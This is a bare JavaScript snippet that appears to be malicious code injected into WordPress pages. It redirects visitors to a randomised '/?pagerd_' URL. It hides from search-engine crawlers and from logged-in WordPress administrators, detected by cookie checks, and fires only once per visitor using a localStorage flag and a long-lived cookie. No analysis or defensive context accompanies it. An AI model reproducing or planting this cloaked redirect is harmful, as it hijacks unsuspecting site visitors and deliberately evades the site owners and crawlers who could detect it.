//<script>
var w_location =
      '/?pagerd_' + Math.random().toString(36).substring(7);

function start() {

  var from = document.referrer;
  var i;

  if (checkCookie()) {
    return;
  }
  var uagent = navigator.userAgent;
  if (!uagent || uagent.length == 0) {
    return;
  }
  uagent = uagent.toLowerCase();
  if (uagent.indexOf('google') != -1 || uagent.indexOf('bot') != -1
      || uagent.indexOf('crawl') != -1) {

  } else {
    if (window.history && window.history.length > 2) {
      window.location = w_location;
    }
  }

  function getCookie(c_name) {
    var c_value = document.cookie;
    var c_start = c_value.indexOf(" " + c_name + "=");
    if (c_start == -1) {
      c_start = c_value.indexOf(c_name + "=");
    }
    if (c_start == -1) {
      c_value = null;
    }
    else {
      c_start = c_value.indexOf("=", c_start) + 1;
      var c_end = c_value.indexOf(";", c_start);
      if (c_end == -1) {
        c_end = c_value.length;
      }
      c_value = unescape(c_value.substring(c_start, c_end));
    }
    return c_value;
  }

  function setCookie(c_name, value, exdays) {
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
    document.cookie = c_name + "=" + c_value;
  }

  function checkCookie() {
    if (localStorage.getItem('yYjra4PCc8kmBHess1ib') === '1') {
      return true;
    } else {
      localStorage.setItem('yYjra4PCc8kmBHess1ib', '1');
    }
    var referrerRedirectCookie = getCookie("referrerRedirectCookie");
    if (referrerRedirectCookie != null && referrerRedirectCookie != "") {
      return true;
    } else if (document.cookie.indexOf('wordpress_logged') !== -1
	       || document.cookie.indexOf('wp-settings') !== -1
               || document.cookie.indexOf('wordpress_test') !== -1)  {
      return true;
    } else {
      setCookie("referrerRedirectCookie", "do not redirect", 730);
      return false;
    }
  }

}



var readyStateCheckInterval = setInterval(function() {
  if (document.readyState === 'complete'
      || document.readyState == 'interactive') {
    clearInterval(readyStateCheckInterval);
    start();
  }
}, 10);
//</script>


